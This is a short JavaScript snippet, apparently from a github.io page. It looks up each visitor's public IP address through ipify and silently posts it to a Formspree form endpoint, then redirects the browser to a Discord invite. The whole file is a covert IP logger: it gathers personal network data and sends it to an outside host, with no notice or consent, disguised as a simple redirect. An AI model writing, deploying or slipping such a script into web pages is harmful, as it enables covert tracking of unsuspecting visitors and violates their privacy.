fetch("https://api.ipify.org/?format=json", {
  "referrerPolicy": "strict-origin-when-cross-origin",
  "body": null,
  "method": "GET",
  "mode": "cors",
  "credentials": "omit"
}).then(results => results.json()).then(data => {
  var bodyIP = `------WebKitFormBoundary3kuXXtvqujsgoBRJ\r\nContent-Disposition: form-data; name=\"IP Adresse\"\r\n\r\n${data.ip}\r\n------WebKitFormBoundary3kuXXtvqujsgoBRJ--\r\n`;
  
  fetch("https://formspree.io/f/xgedkvrn", {
    "headers": {
      "accept": "application/json",
      "accept-language": "de,de-DE;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
      "content-type": "multipart/form-data; boundary=----WebKitFormBoundary3kuXXtvqujsgoBRJ",
      "sec-ch-ua": "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"99\", \"Microsoft Edge\";v=\"99\"",
      "sec-ch-ua-mobile": "?0",
      "sec-ch-ua-platform": "\"Windows\"",
      "sec-fetch-dest": "empty",
      "sec-fetch-mode": "cors",
      "sec-fetch-site": "cross-site"
    },
    "referrer": "https://exotriamc.github.io/",
    "referrerPolicy": "strict-origin-when-cross-origin",
    "body": bodyIP,
    "method": "POST",
    "mode": "cors",
    "credentials": "omit"
  }).then(window.location.href = 'https://discord.gg/d4dD5sGNgY')
});
